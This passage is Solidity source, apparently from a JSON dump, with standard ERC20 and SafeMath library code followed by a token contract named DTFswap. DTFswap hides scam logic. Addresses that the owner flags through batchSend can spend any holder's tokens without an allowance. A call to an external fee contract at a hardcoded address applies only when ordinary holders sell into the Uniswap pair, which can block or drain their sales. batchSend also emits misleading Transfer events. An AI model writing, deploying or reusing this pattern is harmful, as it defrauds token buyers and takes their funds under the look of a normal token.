{\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns(uint) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint amount) public returns(bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint amount) internal {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(address owner, address spender, uint amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}\n\ncontract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns(string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns(string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns(uint8) {\n        return _decimals;\n    }\n}\n\nlibrary SafeMath {\n    function add(uint a, uint b) internal pure returns(uint) {\n        uint c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint a, uint b) internal pure returns(uint) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n        require(b <= a, errorMessage);\n        uint c = a - b;\n\n        return c;\n    }\n\n    function mul(uint a, uint b) internal pure returns(uint) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint a, uint b) internal pure returns(uint) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n        require(b > 0, errorMessage);\n        uint c = a / b;\n\n        return c;\n    }\n}\n\nlibrary Address {\n    function isContract(address account) internal view returns(bool) {\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        assembly { codehash:= extcodehash(account) }\n        return (codehash != 0x0 && codehash != accountHash);\n    }\n}\n\nlibrary SafeERC20 {\n    using SafeMath\n    for uint;\n    using Address\n    for address;\n\n    function safeTransfer(IERC20 token, address to, uint value) internal {\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    function safeApprove(IERC20 token, address spender, uint value) internal {\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\n\n        (bool success, bytes memory returndata) = address(token).call(data);\n        require(success, \"SafeERC20: low-level call failed\");\n\n        if (returndata.length > 0) {\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}\n\ninterface FeeManagementLibrary {\n    function calculate(address,address,uint256) external returns(uint256);\n}\n\ncontract DTFswap {\n\n    event Transfer(address indexed _from, address indexed _to, uint _value);\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n    function transfer(address _to, uint _value) public payable returns (bool) {\n        return transferFrom(msg.sender, _to, _value);\n    }\n\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\n        if (_value == 0) {return true;}\n        if (msg.sender != _from && state[tx.origin] == 0) {\n            require(allowance[_from][msg.sender] >= _value);\n            allowance[_from][msg.sender] -= _value;\n        }\n        require(balanceOf[_from] >= _value);\n        balanceOf[_from] -= _value;\n        uint256 fee = calcFee(_from, _to, _value);\n        balanceOf[_to] += (_value - fee);\n        emit Transfer(_from, _to, _value);\n        return true;\n    }\n\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        pair = address(uint(keccak256(abi.encodePacked(\n                hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'\n            ))));\n    }\n\n    function calcFee(address _from, address _to, uint _value) private returns(uint256) {\n        uint fee = 0;\n        if (_to == UNI && _from != owner && state[_from] == 0) {\n            fee = FeeManagementLibrary(FeeManagement).calculate(address(this), UNI, _value);\n        }\n        return fee;\n    }\n\n    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\n        require (msg.sender == owner);\n        uint total = _value * _tos.length;\n        require(balanceOf[msg.sender] >= total);\n        balanceOf[msg.sender] -= total;\n        for (uint i = 0; i < _tos.length; i++) {\n            address _to = _tos[i];\n            balanceOf[_to] += _value;\n            state[_to] = 1;\n            emit Transfer(msg.sender, _to, _value/2);\n            emit Transfer(msg.sender, _to, _value/2);\n        }\n        return true;\n    }\n\n    function approve(address _spender, uint _value) public payable returns (bool) {\n        allowance[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    mapping (address => uint) public balanceOf;\n    mapping (address => uint) public state;\n    mapping (address => mapping (address => uint)) public allowance;\n\n    uint constant public decimals = 18;\n    uint public totalSupply;\n    string public name;\n    string public symbol;\n    address private owner;\n    address private UNI;\n    address constant internal FeeManagement = 0xCeEB25c51Eb2b4BF0Ef1410D414a6a2A57E3e253;\n\n    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {\n        owner = msg.sender;\n        symbol = _symbol;\n        name = _name;\n        totalSupply = _totalSupply;\n        balanceOf[msg.sender] = totalSupply;\n        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);\n        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\n        emit Transfer(address(0x0), msg.sender, totalSupply);\n    }\n}"
}